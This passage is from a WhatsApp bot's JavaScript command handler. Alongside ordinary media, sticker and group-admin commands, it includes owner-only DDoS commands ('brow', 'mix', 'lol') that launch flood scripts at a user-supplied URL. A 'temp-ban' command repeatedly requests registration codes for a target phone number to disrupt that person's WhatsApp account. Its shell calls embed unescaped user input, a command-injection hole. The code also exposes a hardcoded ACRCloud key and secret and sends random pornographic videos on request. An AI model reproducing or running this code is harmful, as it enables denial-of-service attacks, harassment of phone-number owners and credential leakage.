if (!text) return m.reply(`Example: ${prefix + command} [Tag Orang]`)
try {
let who
	if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
	else who = `${text}`
	let url = await ptz.profilePictureUrl(who, "image");
	await ptz.sendFile(
		m.chat,
		url,
		"profile.jpg",
		`@${who.split`@`[0]}`,
		m,
		null,
		{ mentions: [who] }
	)}catch (error) {
m.reply(`Tidak Dapat Mengambil Foto Profile`);
    }
}
break
        
case "getsw":{
  if (m.quoted?.chat != "status@broadcast")
return m.reply(`Reply Status WhatsApp !`);
  let buffer = await m.quoted.download();
  await ptz.sendFile(m.chat, buffer, "", m.quoted.text || "", null, false, {quoted: m,})
.catch((_) => m.reply(m.quoted.text || ""));
}
break;
        
case 'listsw':
        {
          if (!store.messages["status@broadcast"].array.length === 0)
            throw "Gaada 1 status pun";
          let stories = store.messages["status@broadcast"].array;
          let story = stories.filter(
            (v) => v.message && v.message.protocolMessage?.type !== 0,
          );
          if (story.length === 0) throw "Status gaada";
          const result = {};
          story.forEach((obj) => {
            let participant = obj.key.participant || obj.participant;
            participant = jidNormalizedUser(
              participant === "status_me" ? ptz.user.id : participant,
            );
            if (!result[participant]) {
              result[participant] = [];
            }
            result[participant].push(obj);
          });
          let type = (mType) =>
            getContentType(mType) === "extendedTextMessage"
              ? "text"
              : getContentType(mType).replace("Message", "");
          let text = "";
          for (let id of Object.keys(result)) {
            if (!id) return;
            text += `*- ${await ptz.getName(id)}*\n`;
            text += `${result[id].map((v, i) => `${i + 1}. ${type(v.message)}`).join("\n")}\n\n`;
          }
          await m.reply(text.trim(), { mentions: Object.keys(result) });
        }
        break
        
case 'upsw': 
        {
          if (!isCreator) return newReply('Owners only') 
          if (args.length < 1) return m.reply("perihal apa?");
          if (/image/.test(mime)) {
            let imgSw = await ptz.downloadAndSaveMediaMessage(quoted);
            await ptz.sendMessage(
              "status@broadcast",
              { image: { url: imgSw }, caption: q },
              { statusJidList: pendaftar },
            );
             newReply('Done')
          } else if (/video/.test(mime)) {
            let VidSw = await ptz.downloadAndSaveMediaMessage(quoted);
            await ptz.sendMessage(
              "status@broadcast",
              { video: { url: VidSw }, caption: q },
              { statusJidList: pendaftar },
            );
            newReply('Done')
            
          } else if (/audio/.test(mime)) {
            let VnSw = await ptz.downloadAndSaveMediaMessage(quoted);
            await ptz.sendMessage(
              "status@broadcast",
              { audio: { url: VnSw }, mimetype: "audio/mp4", ptt: true },      
              { backgroundColor: "#FF000000", statusJidList: pendaftar }, // #FF000000
            );
            newReply('Done')
          } else if (q) {
            ptz.sendMessage(
              "status@broadcast",
              { text: q },
              { backgroundColor: "#FF000000", font: 3, statusJidList: pendaftar },
            );
          } else {
            newReply(
              "Replay Media Jika Mau Dengan Caption Ketik .status caption",
            );
          }
        }
break
        
case 'ytaudio':
case 'playmusik':
case 'playmusic': {
if (!q) return m.reply("Kirim perintah judul lagu/link youtube nya bwang")
let rus = await yts(q)
if(rus.all.length == "0") return m.reply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')
try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}

let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });

try{
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}
let inithumb = await getBuffer(thumbnya)
let toks =`
📂 Judul : ${res.title}
🌐 Ditonton : ${h2k(res.views)} Kali
⏳ Durasi : ${res.timestamp}
👤 Channel : ${res.author.name}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}`
ptz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true, 
title: `${res.title}`,
body: `kiw kiw`,
mediaType: 2,  
renderLargerThumbnail : true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}}, image: {url: inithumb},text: toks},{quoted: m})       
try{
//setReply("*Downloading...*")
let info = await ytdl.getInfo(res.url);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var loww = audioFormats[2].contentLength
} catch (err){
var loww = audioFormats[0].contentLength
}
if(Number(loww) > 15000000 ) return m.reply(`Bjir sizenya ${FileSize(loww)}\nAu ah ga mao download 😤`)
if(audioFormats[0].contentLength == "undefined"){
var russ = await yts(res.url)
var dataa = await russ.all.filter(v => v.type == 'video')
var ress = dataa[0]
if(ress.timestamp.split(":") > "10") return m.reply("Tidak bisa mendownload audio lebih dari 10 menit")
}
downloadMp3(res.url)
} catch (err){
console.log(err)
}

}
break
        
case'speech':{
    const lister = [
`Adult Female`,
`Adult Female`,
`Adult Male`,
`Adult Male`,
`Adult Male`,
`Adult Male`,
`Adult Male`,
`Adult Male`,
`Adult Male`,
`Adult Male`,
`Female Whisper`,
`Male Whisper`,
`Mary`,
`Mary Telephone`,
`Mary Hall`,
`Mary Space`,
`Mary Stadium`,
`Mike`,
`Mike Telephone`,
`Mike Hall`,
`Mike Space`,
`Mike Stadium`,
`RoboSoft Five`,
`RoboSoft Four`,
`RoboSoft One`,
`RoboSoft Six`,
`RoboSoft Three`,
`RoboSoft Two`,
`Sam`,
`BonziBUDDY`
];

const readMore = String.fromCharCode(8206).repeat(4001);

const query = `Input query!\n\n*Example:*\n${prefix + command} [number]|[text]\n\n*Choose a number from the list*\n` + readMore + lister.map((v, index) => `  ${index + 1}. ${v}`).join("\n");

if (args.length < 1 && (!m.quoted || !m.quoted.text)) {
    throw query;
}

const text = args.length >= 1 ? args.join(" ") : m.quoted.text;
const [atas, bawah, kiri, kanan] = text.split("|");

if (!atas || !bawah) {
    return m.reply(query);
}
await m.reply("sabar" + "\n" + lister[atas - 1])
try {
    const res = await SayTTS(lister[atas - 1], bawah, kiri || 140, kanan || 157);
    if (res) {
        await ptz.sendMessage(m.chat, {
            audio: res,
            mimetype: 'audio/mp4',
            ptt: true,
            waveform: [100, 0, 100, 0, 100, 0, 100]
        }, {
            quoted: m
        });
    }
} catch (e) {
    await m.reply("Error: " + e.message);
}

}
        break

case'ttsearch':{
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
ptz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
const capt = anu.result.title
await ptz.sendMessage(m.chat, { video: { url: anu.result.no_watermark}, caption: `🔖TITLE : ${capt}`}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
}catch (error) {
m.reply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break
      
case 'pucoyo': {    
let { pinterest } = require('./lib/scraper')
var anu = await pinterest(`pucoyo`)
var result = anu[Math.floor(Math.random() * anu.length)]
ptz.sendImageAsSticker(from, result, m, { packname: global.packname, author: global.author })
}
break   
     
case 'ekuning': {    
let { pinterest } = require('./lib/scraper')
var anu = await pinterest(`meme emoji kuning`)
var result = anu[Math.floor(Math.random() * anu.length)]
ptz.sendImageAsSticker(from, result, m, { packname: global.packname, author: global.author })
}
break   
        
case 'dino': {    
let { pinterest } = require('./lib/scraper')
var anu = await pinterest(`dino kuning`)
var result = anu[Math.floor(Math.random() * anu.length)]
ptz.sendImageAsSticker(from, result, m, { packname: global.packname, author: global.author })
}
break   
        
case 'kuromi': {    
let { pinterest } = require('./lib/scraper')
var anu = await pinterest(`kuromi`)
var result = anu[Math.floor(Math.random() * anu.length)]
ptz.sendImageAsSticker(from, result, m, { packname: global.packname, author: global.author })
}
break   
        
case 'apaan':{
const { bokep } = require('./lib/bokep') 
const bokepnya = bokep[Math.floor(Math.random() * bokep.length)]
ptz.sendMessage(m.chat, {
    video: { url: bokepnya },
    viewOnce: true,
    caption: 'Cih Sange',
    }, { quoted: m});
}
break
  
case 'ometv':
if (!isCreator) return newReply('Owners only') 
var resultnyak = pickRandom(ometv)
ptz.sendMessage(m.chat, { caption: "Random Ometv", video: { url: resultnyak.url } }, { quoted: m })
break       
        
case 'naughty':
if (!isCreator) return newReply('Owners only') 
var resultnya = pickRandom(akira)
ptz.sendMessage(m.chat, { caption: "Random Naughty", image: { url: resultnya.url } }, { quoted: m })
break
        
case "sindy":{
if (!text) return m.reply(`*• Example:* ${prefix + command} halo`);
try {
let gpt = await (
await fetch(`https://itzpire.site/ai/botika?q=${text}&user=${m.sender}&model=sindy`)
).json();
m.reply("*[ SINDY - AI ]* " + "\n\n" + gpt.result);
} catch (e) {
return m.reply("`*Gpt Not Responded*`");
}}
break;

case "totag":{
  if (!m.quoted)
return m.reply(`Reply pesan dengan caption ${prefix + command}`);
ptz.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map((a) => a.id),
  });
}
break;  
        
case'q': case 'qreply': {
if (!isCreator) return newReply('gamau ahh.')
if (!m.quoted) return newReply('Reply Pesannya!!')
let gwm = await ptz.serializeM(await m.getQuotedObj())
if (!gwm.quoted) return newReply('Pesan Yang anda reply tidak mengandung reply')
await gwm.quoted.copyNForward(m.chat, true)
}
break      
case 'play':{
if (!text) return m.reply(`Example : ${prefix + command} Happy Person`)
await ptz.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})   
let search = await yts(`${text}`)

let data = await search.all.filter((v) => v.type == 'video')
try {
var res12 = data[0]
} catch {
var res12 = data[1]
}
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./tmp/${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
ptz.sendMessage(m.chat, {
audio: fs.readFileSync(mp3file), 
mimetype: 'audio/mpeg', 
contextInfo: {
externalAdReply: {
title: `${search.all[0].title}`, 
body: `Views : ${search.all[0].views}`, 
thumbnailUrl: res12?.thumbnail, 
mediaType: 2, 
mediaUrl: `${search.videos[0].url}`, 
sourceUrl: `${search.videos[0].url}`, 
renderLargerThumbnail: false }}})
   })
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})      
}
break

case  'qcimg':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
//const username = await alice.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await ptz.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
ptz.sendMessage(from,{image: buffer},{quoted : m})
})
}
break
        
case 'qc2': {
      try {
        m.reply("sabar");
        const dia = (m.quoted?.text ? m.quoted : m).sender;
        const name = await ptz.getName(dia);
        let teks = m.quoted ? m.quoted.text : q ? q : "";
        let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
        const avatar = await ptz.profilePictureUrl(dia, "image").catch(_ => "https://telegra.ph/file/89c1638d9620584e6e140.png");

        if (isImage || isQuotedImage) {
          let media = await ptz.downloadAndSaveMediaMessage(quoted, makeid(5));
          let anu = await TelegraPh(media);
          const json = {
            type: "quote",
            format: "png",
            backgroundColor: "apiColor",
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
              entities: [],
              media: {
                url: anu
              },
              avatar: true,
              from: {
                id: pickRandom([0, 4, 5, 3, 2, 7, 5, 9, 8, 1, 6, 10, 9, 7, 5, 3, 1, 2, 4, 6, 8, 0, 10]),
                name,
                photo: {
                  url: avatar
                }
              },
              text: `${teks}`,
              replyMessage: {}
            }]
          };
          const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
            headers: {
              "Content-Type": "application/json"
            }
          }).catch(e => e.response || {});
          if (!data.ok) throw data;
          const buffer = Buffer.from(data.result.image, "base64");
          makeSticker(buffer, Sticker, StickerTypes);
          fs.unlinkSync(media);
        } else if (isQuotedSticker) {
          let media = await ptz.downloadAndSaveMediaMessage(quoted, makeid(5));
          let ran = getRandomFile('.png');
          exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
            fs.unlinkSync(media);
            if (err) return m.reply(err);
            let anuah = await TelegraPh(ran);
            const json = {
              type: "quote",
              format: "png",
              backgroundColor: apiColor,
              width: 512,
              height: 768,
              scale: 2,
              messages: [{
                entities: [],
                media: {
                  url: anuah
                },
                avatar: true,
                from: {
                  id: pickRandom([0, 4, 5, 3, 2, 7, 5, 9, 8, 1, 6, 10, 9, 7, 5, 3, 1, 2, 4, 6, 8, 0, 10]),
                  name,
                  photo: {
                    url: avatar
                  }
                },
                text: `${teks}`,
                replyMessage: {}
              }]
            };
            const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
              headers: {
                "Content-Type": "application/json"
              }
            }).catch(e => e.response || {});
            if (!data.ok) throw data;
            const buffer = Buffer.from(data.result.image, "base64");
            makeSticker(buffer, Sticker, StickerTypes);
            fs.unlinkSync(ran);
          });
        } else {
          const json = {
            type: "quote",
            format: "png",
            backgroundColor: apiColor,
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
              entities: [],
              avatar: true,
              from: {
                id: pickRandom([0, 4, 5, 3, 2, 7, 5, 9, 8, 1, 6, 10, 9, 7, 5, 3, 1, 2, 4, 6, 8, 0, 10]),
                name,
                photo: {
                  url: avatar
                }
              },
              text: `${teks}`,
              replyMessage: {}
            }]
          };
          const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
            headers: {
              "Content-Type": "application/json"
            }
          }).catch(e => e.response || {});
          if (!data.ok) m.reply(data);
          const buffer = Buffer.from(data.result.image, "base64");
          makeSticker(buffer, Sticker, StickerTypes);
          /*
          let patth = await getRandom('.jpg') 
          let r = await UrlToPath(avatar,patth)
          let ava = await TelegraPh (patth).catch(_ => TelegraPh (patth))
          let data = `https://mineApi/api/qc?text=${teks}&username=${name}&avatar=${ava}`
          makeSticker(data,Sticker, StickerTypes)
          fs.unlinkSync(patth)
          */
        }
      } catch (e) {
        m.reply('sistem eror coba lagi nanti');
        console.log(e);
        return;
      }
    }
    // db.data.users[sender].limit -= 1 // -1 limit
    break;
        
case 'closetime':
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.Badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
ptz.groupSettingUpdate(from, 'announcement')
m.reply(close)
}, timer)
break
  
case 'opentime':
if (!isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.Badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
ptz.groupSettingUpdate(from, 'not_announcement')
m.reply(open)
}, timer)
break
        
case 'getweb': {
if (!text) return m.reply('🚩 Where is the link?')
m.reply("🚩 Process, Please Be Patient")
let anu = await fetchJson(`https://api.caliph.biz.id/api/tools/pagelinks?url=${text}&apikey=${caliph}`)
ptz.sendMessage(m.chat, { document : { url : anu.data }, fileName : `${text}`, mimetype: 'application/zip' }, { quoted : m })
}
break 
        
case 'listgc': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*Group Chat*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await ptz.groupMetadata(i)
teks += `*Name :* ${metadata.subject}
*Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
*ID :* ${metadata.id}
*Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
*Member :* ${metadata.participants.length}\n\n──────────────\n\n`
}
ptz.sendTextWithMentions(m.chat, teks, m)
}
break
        
case 'listpc': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `*PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `*Name :* ${nama}\n*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 ptz.sendTextWithMentions(m.chat, teks, m)
             }
             break
        
case 'whatmusic':{
let acr = new acrcloud({
  host: "identify-eu-west-1.acrcloud.com",
  access_key: "c9f2fca5e16a7986b0a6c8ff70ed0a06",
  access_secret: "PQR9E04ZD60wQPgTSRRqwkBFIWEZldj0G3q7NJuR",
})
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (/audio|video/.test(mime)) {
let media = await q.download()
let ext = mime.split('/')[1]
fs.writeFileSync(`./tmp/${m.sender}.${ext}`, media)
let res = await acr.identify(fs.readFileSync(`./tmp/${m.sender}.${ext}`))
let { code, msg } = res.status
if (code !== 0) throw msg
let { title, artists, album, genres, release_date } = res.metadata.music[0]
let txt = `

𝚁𝙴𝚂𝚄𝙻𝚃

• 📌 *TITLE*: ${title}
• 👨‍🎤 𝙰𝚁𝚃𝙸𝚂𝚃: ${artists !== undefined ? artists.map(v => v.name).join(', ') : 'NOT FOUND'}
• 💾 𝙰𝙻𝙱𝚄𝙼: ${album.name || 'NOT FOUND'}
• 🌐 𝙶𝙴𝙽𝙴𝚁: ${genres !== undefined ? genres.map(v => v.name).join(', ') : 'NOT FOUND'}
• 📆 RELEASE DATE: ${release_date || 'NOT FOUND'}

`.trim()
fs.unlinkSync(`./tmp/${m.sender}.${ext}`)
m.reply(txt)
} else m.reply('*𝚁𝙴𝚂𝙿𝙾𝙽𝙳 𝙰𝚄𝙳𝙸𝙾*')
}
break
        
case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply (`🚩 Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply (`🚩 Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
let media = await ptz.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
ptz.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', fileName: `Convert By ${ptz.user.name}.mp3`}, { quoted : m })
}
break       
/*       
case 'whatmusic': {
if (!/audio/.test(mime)) return m.reply(`🚩 Only for audio.`)
if (!quoted) return m.reply(`🚩 Reply Audio.`)
let { UploadFileUgu } = require('./lib/uploader')
let media = await ptz.downloadAndSaveMediaMessage(quoted)
let pu = await UploadFileUgu(media)
let jsonq = await fetchJson(`https://aemt.me/whatmusic?url=${pu.url}`)
m.reply(jsonq.result)
}
break       
*/  
        
case "tqto":{
  me = m.sender;
  creditos = `Hallo Sis, here are the names who have been registered in creating/helping in the development of this script

*BIG TAHNKS TO*

> Siputzx [ penyedia Base ]
> KyuuRzy
> GhostXdzz
> Hyuu Offc
> TheZetsuboXygen
> Juna
> Adrian

ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴋʏᴜᴜʀᴢʏ`
ptz.sendMessage(m?.chat, { 
text: creditos, 
contextInfo: { 
forwardingScore: 10, 
isForwarded: true, 
mentionedJid: [m?.sender],
businessMessageForwardInfo: { 
businessOwnerJid: '6281351692548@s.whatsapp.net'
},
forwardedNewsletterMessageInfo: {
newsletterJid: '120363196693847188@newsletter',
serverMessageId: 103,
newsletterName: "Special Thanks To "
},
externalAdReply: { 
title: `Kyuu`, 
thumbnail: menunya, 
}}})
}
break;
        
case 'brow': {
if (!isCreator) return
if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./lib/DDoS/brow.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break    
        
case 'mix': {
if (!isCreator) return
if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./lib/DDoS/mix.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break    
        
case'lol':{
if (!isCreator) return
if (!text) return newReply(`*Example*: ${prefix + command} [url]`)
let ddosin = require("./lib/lol.js")
ddosin(`${text}`)
if (args.length === 1 && text) {
newReply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`)
exec(`node ./lib/lol.js`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}}
break
        
case 'temp-ban': {
if (!isCreator) return
if (!text) return m?.reply(`example ${command} 62|87872627288`)
if (!/|/.test(text)) return m?.reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
let numbers = JSON.parse(fs.readFileSync('./database/tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await m?.reply(`👤 Sukses! Gangguan Registrasi telah berhasil dikirim ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down 🩸.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./database/tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break       
 
case'smeta': {
//if (!q) return vinReply ( 'Reply a sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                    if (!/webp/.test(mime)) throw m.reply('Reply sticker!')
                        //let img = await q.download()
                            let img = await ptz.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) throw 'Reply a sticker!'
                                    var stiker = await addExifAvatar(img, `KyuuRzy😜`, `${pushname}`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) ptz.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else throw 'reply sticker'
                                                                              }
                                                                              }
                                                                             
                                                                              break
        
case 'delsesi':
case 'clearsession':{
fs.readdir("./session", async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return m?.reply('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return m?.reply(teks)
filteredArray.map(function(e, i) {
teks += (i + 1) + `. ${e}\n`
})
m?.reply(teks)
await sleep(2000)
m?.reply("Menghapus file sampah...")
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
m?.reply("Berhasil menghapus semua sampah di folder session")
});
}    
break
//=================================================//
case "add":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di tambahkan')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
//=================================================//
case "kick":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
//=================================================//
case "promote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
//=================================================//
case "demote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break
//=================================================//
case "naw":{
if (!text) return m.reply("mau nanya apa sama naw")
let { data } = await axios.get("https://gemini.ptz.fund/api/naw?text=" + text)
m.reply(data.text)
}
break
//=================================================//
case "gemini-img":
if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`);
if (!/image/.test(mime)) return m.reply("hanya support gambar");
if (!text) return m.reply("mau nanya apa sama gambar itu?")
try {
let bufferData = await quoted.download();
let base64Data = bufferData.toString('base64');
let { data } = await axios.post('https://gemini.ptz.fund/api/img', {
prompt: text,
base64Data: base64Data
});
m.reply(data.text);
} catch (e) { 
m.reply(e);
}
break;
//=================================================//
case "gemini":{
if (!text) return m.reply("mau nanya apa sama gemini")
let { data } = await axios.get("https://gemini.ptz.fund/api/ask?text=" + text)
m.reply(data.text)
}
break
//=================================================//
case "ocr":{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply(`balas gambar dengan perintah .ocr`)
if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`_*jenis ${mime} tidak didukung!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await ptz.downloadAndSaveMediaMessage(q)
let url = await TelegraPH(img)
let hasil = await ocrapi.ocrSpace(url)
 await m.reply(hasil.ParsedResults[0].ParsedText)
}
break
//=================================================//
case "stickers":{
if (!text) return m.reply(`Ex : ${prefix + command} kucing`);
const anu = await stickersearch(text);
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 10);

if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await ptz.sendImageAsSticker(m?.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await m?.reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
}
}}
break
//=================================================//
case "tr":{
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else throw `Ex: ${usedPrefix + command} id hello i am robot`
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return m?.reply(`Error : Bahasa"${lang}" Tidak Support`)
m?.reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
}
break
//=================================================//
case 'ss': case 'ssweb':{
if (!/^https?:\/\//.test(text)) return m?.reply('Awali *URL* dengan http:// atau https://')
let krt = await ssweb(text)
ptz.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:m})
}
break
//=================================================//
case "kalkulator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
